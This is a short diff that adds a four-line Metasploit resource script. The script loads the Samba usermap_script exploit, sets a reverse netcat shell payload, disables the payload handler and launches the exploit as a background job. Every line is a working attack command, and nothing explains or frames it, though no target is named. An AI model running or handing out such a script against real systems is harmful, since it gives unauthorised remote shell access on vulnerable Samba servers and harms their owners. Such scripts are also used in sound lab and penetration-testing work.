@@ -1,0 +1,4 @@
+use exploit/multi/samba/usermap_script
+set PAYLOAD cmd/unix/reverse_netcat
+set DisablePayloadHandler true
+exploit -j
